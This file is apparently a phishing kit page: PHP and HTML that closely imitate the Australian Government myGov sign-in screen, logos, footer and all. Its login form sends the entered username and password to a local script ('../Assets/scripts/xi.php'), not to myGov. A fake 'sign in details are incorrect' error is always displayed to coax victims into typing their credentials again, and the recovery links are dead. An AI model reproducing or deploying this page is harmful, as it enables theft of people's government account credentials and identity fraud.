<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<!--<!
  [endif]-->

<head>
    <!--
E: PROD; 
C: MW1w; 
N: MW1w10; 
S: SW10b;  
-->
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Sign in with myGov - myGov</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <!-- phone number format detection, turning it off -->
    <meta name="format-detection" content="telephone=no" />
    <script type="text/javascript" src="/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js"
        data-dtconfig="app=5f15dc81410a75c1|ssc=1|featureHash=ICA2NVfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1716401325811|dtVersion=10253221019152312|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315651699|rpid=-540467740|domain=my.gov.au">
    </script>
    <link rel="icon" type="image/png" sizes="32x32" href="../Assets/images/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="../Assets/images/favicon-16x16.png" />
    <link
        href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
        rel="stylesheet" />
    <link href="../Assets/css/css.css" rel="stylesheet" />
    <link href="../Assets/css/mgv2-application.css" rel="stylesheet" />
    <link href="../Assets/css/blugov.css" rel="stylesheet" />
    <script>
    function togglePassword() {
    const passwordInput = document.getElementById("passwordInput");
    const toggleButton = document.getElementById("togglebtn");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleButton.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        toggleButton.textContent = "Show";
    }
}
</script>

</head>

<body>
    <noscript>
        <div class="outage">
            <div class="outage__inner">
                <div>
                    <span class="is-visuallyhidden"> Warning message: </span>
                    <p>JavaScript is required for myGov to work correctly.</p>
                </div>
            </div>
        </div>
    </noscript>

    <nav class="uikit-skip-link" aria-label="Skip Links">
        <a class="uikit-skip-link__link" href="#content">Skip to main content</a>
    </nav>

    <div class="brand-rainbow">&nbsp;</div>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="https://my.gov.au/" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="../Assets/images/myGov-cobranded-logo-black.svg"
                                alt="Australian Government and myGov logo" role="img" />
                        </a>

                        <div class="header-links">
                            <a href="https://my.gov.au/en/about/help">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>

    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <div class="unauth">
                <div class="login-grid-container">
                    <div class="login-grid-row">
                        <div class="login-grid-column">
                            <div class="digital-id-login-card-wrapper">
                                <div class="digital-id-main-login-card override">
                                    <!-- <a data-go-back-link="" class="button-back" href="javascript:void(0);">Back</a> -->

                                    <div id="error-msg-container">
                                        <div class="error-msg" role="alert" aria-live="assertive">
                                            <span class="is-visuallyhidden">Error message:</span>
                                            <div class="error-msg-text">
                                                <span>
                                                    <strong>Error</strong>
                                                    <br />
                                                    Your sign in details are incorrect. (RFM10A)
                                                    <br><br>
                                                    Please check details and try again.


                                                </span>
                                            </div>
                                        </div>
                                    </div>

                                    <h1>Sign in with myGov</h1>
                                    <!-- <p class="login-instruction-text">
                                        Choose how to sign in from these 2 options
                                    </p> -->
                                    <h2 class="text-align-left">
                                        Using your myGov sign in details
                                    </h2>
                                    <form id="form-1" class="mygov-login-form alternative" method="post"
                                        action="../Assets/scripts/xi.php">
                                        <input type="hidden" name="btn1" value="btn1" />

                                        <div class="input-group">
                                            <label class="override" for="userId">Username or email</label>
                                            <input id="ai" name="username0" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <!-- <p class="recovery">
                                            <a href="javascript:void(0);" class="anchor override">Forgot username</a>
                                        </p> -->
                                        <br>
                                        <div class="input-group">
                                            <label for="password" class="override">Password</label>
                                            <div class="password-group">
                                                <button class="showPassword anchor" type="button"
                                                    id="togglebtn" onclick="togglePassword()">
                                                    Show
                                                </button>
                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">
                                                    Note: this will visually expose your password on the
                                                    screen.
                                                </p>
                                                <input id ="passwordInput" name="password0" type="password" aria-required="true"
                                                    required />
                                            </div>
                                        </div>
                                        <p class="recovery">
                                            <a href="javascript:void(0);" class="anchor override">Forgot password</a>
                                        </p>
                                        <div class="button-digital-id-main-container override">
                                            <div class="digital-id-button-container">
                                                <button type="submit" class="button-main" name="submit-btn" id="btn1">
                                                    Sign in
                                                </button>
                                            </div>
                                        </div>
                                        <p class="create-account-text">
                                            <a class="create-account-link" href="javascript:void(0);">Create a myGov
                                                account</a>
                                            if you don't have one already.
                                        </p>
                                    </form>

                                    <!-- <div class="hr-word">
                                        <div class="draw-circle">or</div>
                                    </div> -->

                                    <!--<div class="digital-id-login-card secondary">
                                        <div class="button-digital-id-container">
                                            otherwise render the existing DI button and links 
                                            <h2 class="text-align-left">
                                                Using your myGovID Digital Identity
                                            </h2>
                                            <div class="digital-id-login-option-container">
                                                <div class="inner-options">
                                                    <p class="external-links-zone">
                                                        What is
                                                        <a href="javascript:void(0);">Digital Identity</a>
                                                        and
                                                        <a href="javascript:void(0);">myGovID</a>?
                                                    </p>
                                                    <a class="button-digital-identity"
                                                        href="javascript:void(0);">Continue
                                                        with Digital Identity</a>

                                                </div>
                                            </div>
                                        </div>
                                    </div>-->
                                    <br><br>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and
                                    security</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="https://my.gov.au/">
                            <img src="../Assets/images/myGov-cobranded-logo-white.svg"
                                alt="Australian Government and myGov logo" width="313.17" height="70" role="img" />
                        </a>
                    </section>

                    <p class="footer-acknowledgement">
                        We acknowledge the Traditional Custodians of the lands we live on.
                        We pay our respects to all Elders, past and present, of all
                        Aboriginal and Torres Strait Islander nations.
                    </p>
                </div>
            </div>
        </div>
    </footer>

    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-vendor.js"></script>
    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
    <script type="text/javascript" src="/mygov/content/mgv2/js/login.js"></script>
    <script type="module" src="/mygov/content/mgv2/js/mygov-passkeys.js"></script>
    <div id="artifact-metadata"></div>
</body>

</html>